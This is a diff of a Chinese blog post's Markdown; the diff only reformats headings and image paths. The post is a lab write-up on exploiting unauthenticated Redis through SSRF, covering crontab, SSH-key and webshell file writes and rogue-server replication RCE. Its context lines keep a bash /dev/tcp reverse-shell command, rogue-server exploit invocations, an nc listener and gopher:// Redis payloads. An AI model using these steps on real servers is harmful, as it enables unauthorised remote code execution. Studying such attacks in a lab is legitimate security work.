@@ -9,13 +9,13 @@ tags:  redis
 ssrf会造成内网漫游，redis作为一种内网常用的中间件易受到攻击，本文主要实践了redis未授权下的攻击和利用，主要从写文件和主从复制RCE两个方面进行了阐述，期间遇到了一些坑，记录下来以飨众人。
 <!-- more -->
 
-### 写文件
+## 写文件
 
 写文件这个功能其实就是通过修改redis的dbfilename、dir配置项，通常来说掌控了写文件也就完成了rce的一半，这几种写文件来getshell的方式也是最有效最简单的。
 
-#### Windows
+### Windows
 
-##### 开机自启动
+#### 开机自启动
 
 在Windows 系统中有一个特殊的目录叫自启动目录，在这个目录下的文件在开机的时候都会被运行。
 
@@ -64,9 +64,9 @@ $ python tran2gopher.py socat_windows_startup.log
 ```
 
 然后还需对上面内容的特殊字符进行url编码，比如%，因为ssrf利用经过了两个协议（先http后gopher），最终payload触发，
-![image-20200723164207035.png](https://i.loli.net/2020/07/24/TqmCQrOR6ZE8gVh.png)
+![/data/typora_assets/redis/image-20200723164207035.png](https://i.loli.net/2020/07/24/TqmCQrOR6ZE8gVh.png)
 
-#### Linux
+### Linux
 
 以下三种利用方式都需要有写文件权限（这不废话），需要redis以root权限运行。
 redis原始信息
@@ -83,7 +83,7 @@ redis原始信息
 "\n\n12345\n"
 ```
 
-##### crontab
+#### crontab
 
 定时任务目录
 ```shell
@@ -247,13 +247,13 @@ Jul 18 19:38:20 mint-VirtualBox crontab[2967]: (root) LIST (root)
 Jul 18 19:39:01 mint-VirtualBox CRON[2975]: (root) CMD (bash -i >& /dev/tcp/192.168.0.106/2333 0>&1)
 ```
 果然没再报错，但是依旧没有反弹shell，是不是反弹shell命令写错了？我们尝试直接执行是没有问题的，
-![image-20200718194424795](https://i.loli.net/2020/07/24/BLlkCrbD8aujJvV.png)
+![/data/typora_assets/redis/20200718194424795.png](https://i.loli.net/2020/07/24/BLlkCrbD8aujJvV.png)
 后来发现这篇文章，
 
 https://www.onebug.org/websafe/98675.html
 
 里面提到“bash -i反弹shell都失败，不过python，perl可以”，换成python的试一下，确实可以，
-![image-20200718200550210](https://i.loli.net/2020/07/24/YViLD2kGw1CsZoA.png)
+![/data/typora_assets/redis/20200718200550210.png](https://i.loli.net/2020/07/24/YViLD2kGw1CsZoA.png)
 我们使用python反弹shell试一下ubuntu是否真的会受格式影响，
 
 ```shell
@@ -278,13 +278,13 @@ redis-bitsÀ@ú^EctimeÂ}æ^R_ú^Hused-memÂ¨Ó^L^@ú^Laof-preambleÀ^@þ^@û^A
 ÿáÍëÝîÇpá
 ```
 16进制查看，
-![image-20200718214546791](https://i.loli.net/2020/07/24/Vzei6OFRBC8aSGX.png)
+![/data/typora_assets/redis/20200718214546791.png](https://i.loli.net/2020/07/24/Vzei6OFRBC8aSGX.png)
 按照
 
 https://lorexxar.cn/2016/12/03/redis-getshell/ 
 
 这篇文章所讲好像发生了截断？但是具体怎么个截断法，没搞明白，是否可能构造出完美payload有待研究？如果写入字符比较少就不会发生截断，例如，
-![image-20200718220052178](https://i.loli.net/2020/07/24/3TlSW2YkRxQreUf.png)
+![/data/typora_assets/redis/20200718220052178.png](https://i.loli.net/2020/07/24/3TlSW2YkRxQreUf.png)
 最后我们尝试一下，如果不发生截断的情况下写到`/var/spool/cron/crontabs/root`文件，能否反弹shell，我们手动更改`/var/spool/cron/crontabs/root`文件内容如下，
 
 ```shell
@@ -297,17 +297,17 @@ redis-bitsÀ@ú^EctimeÂ^G^@^S_ú^Hused-memÂè!^M^@ú^Laof-preambleÀ^@þ^@û^A
 ÿ¸l<8e>Ø^Z<9c><90>
 ```
 最后发现是不行的，cron log报时间格式错误、语法错误，
-![image-20200718221117435.png](https://i.loli.net/2020/07/24/wWsuCKPoB5YF3vj.png)
+![/data/typora_assets/redis/20200718221117435.png](https://i.loli.net/2020/07/24/wWsuCKPoB5YF3vj.png)
 总结：
 
 - centos下可以成功写crontab反弹shell。
 - ubuntu下无法写crontab反弹shell，主要原因在于ubuntu对于crontab格式要求比较严格，不允许有语法出错，而redis在写入的时候，在前、后都会附加redis的一些信息；另外就是ubuntu下利用crontab使用bash反弹shell是无法成功的，原因是ubuntu下执行 crontab 使用的是 sh , 而 sh 软连接的是dash ，而不是 bash，那么如果你直接在 cron 里面写 bash - i xx 的反弹是不可能成功的，解决方法有两种，一种就是使用 Python 调用 /bin/sh 反弹 shell ，还有一种可以尝试写 sh 文件，然后用 cron 去执行。利用python可以成功反弹shell，但是python反弹shell的payload比较长，利用redis写到crontab文件的时候会发生莫名的payload截断；最后就是ubuntu用户定时任务必须在600权限才能执行，否则提示INSECURE MODE不予执行。
-- 
-##### webshell
+
+#### webshell
 
 需要知道web目录
 
-##### ssh key
+#### ssh key
 
 ```shell
 # xiaopo @ fht in ~ [22:20:29] C:130
@@ -360,13 +360,13 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOVgEY/clVIFD7U/pbZly0jW5PJs6BV8gG6hKvQT3F
 �a��/ԡOroot@mint-VirtualBox:/data/hack/C/middleware/redis#
 ```
 
-### 反序列化
+## 反序列化
 
 待补充
 
-### 主从复制RCE
+## 主从复制RCE
 
-#### 原理
+### 原理
 
 前言：比起以前的利用方式来说，这种利用方式更为通用，危害也更大，因为随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了。
 
@@ -422,13 +422,13 @@ OK
 
 https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
 主要利用方法如下：
-![image-20200719220535985](https://i.loli.net/2020/07/24/mHsyYI4wLjpgfNh.png)
+![/data/typora_assets/redis/20200719220535985.png](https://i.loli.net/2020/07/24/mHsyYI4wLjpgfNh.png)
 第一步，我们伪装一个redis数据库，然后目标redis将我们的redis数据库设置为主节点。
 第二步，我们获得目标redis dbfilename的值，或设置目标redis的dbfilename为so文件
 第三步，设置传输方式为全量传输，并将已编译为.so文件的攻击扩展作为payload发送。
 第四步，在目标客户机加载dbfilename文件，成功加载扩展，扩展里面实现了任意命令执行。
 
-#### 利用方法
+### 利用方法
 
 利用条件：必需一个外网IP模拟redis rogue server，且内网redis能出外网。
 
@@ -443,7 +443,7 @@ https://github.com/Ridter/redis-rce
 
 运行上面的exp，
 `python3 redis-rce.py -r 127.0.0.1 -p 4444 -L 127.0.0.1 -P 2333 -f exp.so -v`
-![image-20200719231846015.png](https://i.loli.net/2020/07/24/u4rA8xYUHeTRmnt.png)
+![/data/typora_assets/redis/20200719231846015.png](https://i.loli.net/2020/07/24/u4rA8xYUHeTRmnt.png)
 
 注意上面的`FULLRESYNC`流量是master响应包（master在2333端口），响应slave数据库的`PSYNC`请求的（slave端口在6379），而我们抓包流量是4444->6379，所以下面是没有这个包的流量的。
 
@@ -456,10 +456,10 @@ https://github.com/Ridter/redis-rce
 "root\n"
 ```
 但是我们想反弹shell，故继续往下转发流量
-![image-20200720122441757.png](https://i.loli.net/2020/07/24/JalBETWkDe8Pm4z.png)
+![/data/typora_assets/redis/20200720122441757.png](https://i.loli.net/2020/07/24/JalBETWkDe8Pm4z.png)
 
 获得反弹到3000端口的shell，
-![image-20200720122508087.png](https://i.loli.net/2020/07/24/l9xEjsLeHcCOvVS.png)
+![/data/typora_assets/redis/20200720122508087.png](https://i.loli.net/2020/07/24/l9xEjsLeHcCOvVS.png)
 
 拷贝流量到socat.log，需要处理一下socat.log，把前面的INFO部分去掉，得到
 
@@ -542,7 +542,7 @@ system\r
 随后启动redis rogue server，`python3 redis-rogue-server.py --lport 2333 -f redis-rce/exp.so`，启动监听3000端口`$ nc -lvvp 3000`
 先用curl模拟gopher协议测试是否正确，
 
-![image-20200720123201391.png](https://i.loli.net/2020/07/24/zuyqRw4IQxMZ5hO.png)
+![/data/typora_assets/redis/20200720123201391.png](https://i.loli.net/2020/07/24/zuyqRw4IQxMZ5hO.png)
 
 然后利用ssrf漏洞测试也成功触发，记得要对gopher://协议进行特殊字符的url编码，比如%，因为这是经过了两个协议（先http后gopher）
 ```http
@@ -632,7 +632,7 @@ $ curl -v 'gopher://127.0.0.1:6379/_%2a4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSE
 ```
 依然不行，看来还是需要rogue server与之自然交互。
 
-### Lua RCE
+## Lua RCE
 
 原理：
 
@@ -648,7 +648,7 @@ https://github.com/QAX-A-Team/redis_lua_exploit/issues/1
 
 尚未解决
 
-### Tips
+## Tips
 
 参考
 
@@ -677,7 +677,7 @@ OK
 Background saving started
 ```
 
-### 参考
+## 参考
 
 - https://paper.seebug.org/1169/
 - https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf
